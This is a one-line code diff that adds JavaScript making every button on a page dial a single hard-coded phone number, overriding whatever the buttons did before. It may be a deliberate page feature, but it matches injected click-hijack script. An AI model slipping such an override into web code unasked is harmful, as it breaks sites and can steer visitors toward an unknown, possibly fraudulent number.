@@ -1,0 +1,1 @@
+document.querySelectorAll('button').forEach(b=>{b.onclick=()=>location.href='tel:+798880631555';});
